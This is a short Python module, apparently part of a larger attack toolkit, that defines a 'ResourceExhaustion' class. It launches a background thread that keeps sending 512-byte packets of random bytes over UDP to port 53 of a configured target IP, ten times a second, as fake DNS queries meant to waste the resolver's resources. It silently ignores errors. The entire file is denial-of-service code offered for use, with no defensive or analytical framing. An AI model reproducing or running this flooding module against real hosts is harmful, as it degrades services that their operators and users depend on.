"""
Resource Exhaustion attack module
"""

import socket
import time
import threading
import random

class ResourceExhaustion:
    def __init__(self, target_config, config_manager, stats_manager):
        self.target_ip = target_config["ip"]
        self.config_manager = config_manager
        self.stats_manager = stats_manager
        self.is_running = False
        self.thread = None
    
    def start(self):
        """Start resource exhaustion attack"""
        self.is_running = True
        self.thread = threading.Thread(target=self._attack_worker, daemon=True)
        self.thread.start()
    
    def stop(self):
        """Stop resource exhaustion attack"""
        self.is_running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def _attack_worker(self):
        """Resource exhaustion worker thread"""
        while self.is_running:
            try:
                # DNS-like queries to waste resolver resources
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                fake_dns_query = random._urandom(512)
                sock.sendto(fake_dns_query, (self.target_ip, 53))  # DNS port
                sock.close()
            except:
                pass
            
            time.sleep(0.1)